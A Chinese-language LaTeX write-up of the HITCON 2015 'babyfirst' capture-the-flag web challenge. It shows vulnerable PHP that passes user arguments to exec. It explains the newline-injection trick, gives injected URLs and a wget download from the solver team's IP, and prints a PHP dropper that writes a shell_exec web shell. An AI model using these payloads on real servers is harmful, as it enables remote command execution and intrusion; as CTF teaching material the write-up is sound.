%!TEX program = xelatex
\documentclass[a4paper,UTF8]{ctexart}

\usepackage{fontspec}
\usepackage{amsmath}
\usepackage{float}
\usepackage{graphicx}
\usepackage{amssymb}
\usepackage{epstopdf}
\usepackage{mathrsfs}
%\usepackage{stmaryrd}
\usepackage{color}
\usepackage{listings}
\usepackage{ulem}
\usepackage{lmodern}
\usepackage{fontenc}
\usepackage[margin=2cm]{geometry}
\usepackage{titlesec}
\usepackage{tikz}
\usepackage{hyperref}
\usepackage[noblocks]{authblk}

%\setlength{\parskip}{5pt}
%
%\usepackage{MyTitle}
%\titleformat{\section}[hang]{\bfseries\fontsize{16pt}{0pt}\selectfont}{\thesection}{.5em}{}{}


% 对于使用 Tex Pad 打开本 TeX 文档的用户,请使用这行代码
\usepackage[cache=false,outputdir=.texpadtmp]{minted}
% 其它用户使用这行
%\usepackage{minted}
%



%To do: 修改标题和作者及联系方式
\title{HITCON2015 Quals, Web100, babyfirst}

\author{张琦}
\affil{哈尔滨工业大学,计算机科学与技术学院,peterqi37@hit.edu.cn}

\date{}

\begin{document}
\maketitle


%------------------------------------------------------------------------------------------------------------------------------
%------------------------------------------------------------------------------------------------------------------------------
%To do: 正文开始
%------------------------------------------------------------------------------------------------------------------------------
%------------------------------------------------------------------------------------------------------------------------------

\section{题目描述}

本题是web范畴一道分值为 100 的题目,其描述如下:\\

\begin{quizdesc}[label=Web100 babyfirst]
baby, do it first.
http://52.68.245.164
\end{quizdesc}

这道题目比较有趣,网页进去之后并不是一个正常用户使用的网站,我们看到的直接就是网页源码。

\begin{minted}{php}
<?php
    highlight_file(__FILE__);

    $dir = 'sandbox/' . $_SERVER['REMOTE_ADDR'];
    if ( !file_exists($dir) )
        mkdir($dir);
    chdir($dir);

    $args = $_GET['args'];
    for ( $i=0; $i<count($args); $i++ ){
        if ( !preg_match('/^\w+$/', $args[$i]) )
            exit();
    }
    exec("/bin/orange " . implode(" ", $args));
?>
\end{minted}

\section{解题思路}

\subsection{程序运行流程}\label{program-workflow}

分析一下这个代码,可以发现第一句\code{highlight\_file(\_\_FILE\_\_)}是输出php源代码的原因,除了源代码本页面没有任何输出。

然后在网站的sandbox文件夹下,如果不存在以访客ip为名的文件夹则建立一个,然后切换至该文件夹。

然后以get的形式传进args参数,如果args为数组,则对于args数组中的每一个元素进行正则匹配,要求是数字字母下划线,如果有任意一个元素匹配失败,则网页退出;如果args为一个字符串,则仅对这一个字符串进行匹配。

最后如果网页没有退出,则将args数组中的元素以单个空格隔开生成一个字符串衔接到/bin/orange 后面,调用系统shell执行该语句。

\subsection{漏洞分析}

首先要解决的是要将args参数以数组的形式传递进来,否则经过本机的调试,implode函数会因为args只有一个元素而报错。在网上搜寻了一些方法之后,了解到args参数可以以如下形式传递http://52.68.245.164?args[]=123\&args[]=456\&args[]=789,如此便可传进一个含有三个元素的数组args,三个元素分别为123、456、789三个字符串。

根据程序可知,如果正常衔接参数,最终就会是运行一个叫orange的程序,在程序后面加一些参数,参数还必须是数字字母下划线。可是orange到底是干什么的呢?橘子橘子橘子橘子。。。

最后看题解提高了姿势水平,明白了这道题目的关键点,在正则匹配/\^{}$\backslash$w+\$/中,\$可以匹配到换行符!这就意味着,我们在orange后面输出了一个换行符,然后就可以执行我们自己的命令了!

之后的解法就是仁者见仁智者见智了,可以调用linux的命令从我们的ip下载木马脚本到服务器目录下,木马脚本是一些系统命令,把输出重定向到另一文本文件中,然后我们可以直接到sandbox/我们的ip下下载该输出文件。

另一种解法是下载php木马,然而却无法执行该文件,因为无法传入".php"后缀;于是可以使用tar命令将php命令打包成一个未压缩的包,然后使用php运行该包,就成功地运行了php 木马,执行任意命令。

还有一种是使用twistd telnet命令,这条命令似乎是可以将一个python shell绑定到4040端口上,用户名密码默认为admin$\backslash$changeme,不过这种有些高大上,本人还未能弄清楚。

\section{解题过程(使用php木马方法)}

\subsection{第一步:验证\$匹配换行符成功}

http://52.68.245.164?args[]=a\%0A\&args[]=touch\&args[]cat\\
\code{/bin/orange a\\*
touch cat}

于是在我们的网站目录下出现了cat文件,证明我们的想法正确。

\subsection{第二步:下载木马并执行}

执行的shell命令如下:\\
code{mkdir exploit\\cd exploit\\
wget 92775836(这个数字是题解队伍的长整形ip地址,因为不能输入".",因此要这样输入ip地址)\\
tar cvf archived exploit(打包命令)\\
php archived}

下载的exploit如下:

\begin{minted}{php}
<?php
file_put_contents('shell.php', '
    <?php
    header("Content-Type: text/plain");
    print shell_exec($_GET["cmd"]);
    ?>
');
?>
\end{minted}


\subsection{第三步:后续命令}
访问木马php网页shell.php,使用get传递cmd命令,可以直接看到shell返回的输出。

最后在服务器的根目录下发现了Flag:\code{hitcon\{theworldisnotbeautiful,becauseofyou\}}

\section{致谢}

感谢ISpamAndHex, Plaid Parliament of Pwning, p4队伍的题解!本人受益良多。

\end{document}
